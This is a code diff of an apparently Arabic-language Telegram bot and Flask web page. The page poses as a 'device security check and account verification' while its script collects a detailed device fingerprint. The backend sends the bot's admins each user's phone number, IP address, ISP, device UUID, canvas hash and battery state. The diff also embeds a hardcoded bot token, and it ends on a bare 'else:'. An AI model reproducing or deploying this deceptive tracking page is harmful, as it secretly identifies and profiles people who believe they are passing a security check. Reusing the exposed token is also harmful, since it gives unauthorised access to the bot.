@@ -6,10 +6,9 @@ import requests
 import uuid
 import os
 import datetime
-import threading  # إضافة مكتبة الخيوط لضمان الرد اللحظي
+import threading
 
 # ================= الإعدادات الأساسية =================
-# التوكن والآيديهات (تم إضافة الرقم اللي بيبدأ بـ 8 في القائمة الاحتياطية)
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8764397517:AAHNtkUYi15yT8IrkDaK954PBQtgywJ5Mfg")
 ADMINS_STR = os.environ.get("ADMINS", "1358013723,18147516847,8764397517")
 ADMINS = [int(x.strip()) for x in ADMINS_STR.split(",") if x.strip().isdigit()]
@@ -68,7 +67,6 @@ HTML_TEMPLATE = """
             margin: 0 auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
         h2 { 
             font-size: 1.4rem; 
             font-weight: bold; 
@@ -78,7 +76,6 @@ HTML_TEMPLATE = """
             -webkit-text-fill-color: transparent;
         }
         #sub-status { color: #64748b; font-size: 0.9rem; margin-top: 10px; }
-        
         .success-mode h2 { 
             -webkit-text-fill-color: #22c55e; 
             text-shadow: 0 0 10px rgba(34, 197, 94, 0.4);
@@ -91,11 +88,9 @@ HTML_TEMPLATE = """
     </div>
     <h2 id="status">⏳ جاري فحص أمان الجهاز وتوثيق الحساب...</h2>
     <p id="sub-status">يرجى عدم إغلاق هذه الصفحة لضمان اكتمال التوثيق</p>
-    
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-
         async function getDeepFingerprint() {
             let fp = {
                 screen: window.screen.width + "x" + window.screen.height,
@@ -124,7 +119,6 @@ HTML_TEMPLATE = """
                 setTimeout(() => { tg.close(); }, 2500);
             });
         }
-
         function getCanvasHash() {
             let canvas = document.createElement("canvas");
             let ctx = canvas.getContext("2d");
@@ -202,13 +196,11 @@ def save_fingerprint():
 - **الآي دي:** `{user_id}`
 - **الهاتف:** `{phone_num}`
 - **رقم وهمي؟:** `{is_virtual}`
-
 📱 **الهوية الصلبة (Hardware):**
 - **الرقم التسلسلي (UUID):** `{device_uuid}`
 - **بصمة الـ Canvas:** `{data['canvas_hash']}`
 - **الشاشة | المعالج:** `{data['screen']} | {data['cores']} Cores`
 - **البطارية لحظياً:** `{data.get('battery', 'N/A')}`
-
 🌐 **بيانات الشبكة:**
 - **الـ IP:** `{user_ip}`
 - **مزود الخدمة:** `{isp_name}`
@@ -285,7 +277,7 @@ def run_polling():
     bot.infinity_polling(skip_pending=True)
 
 if __name__ == '__main__':
-    # تشغيل البوت في خيط (Thread) منفصل لضمان الرد اللحظي
     threading.Thread(target=run_polling, daemon=True).start()
-    # تشغيل Flask (للبوابة والـ Webhook)
-    port = int(os.environ.get
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
+else:
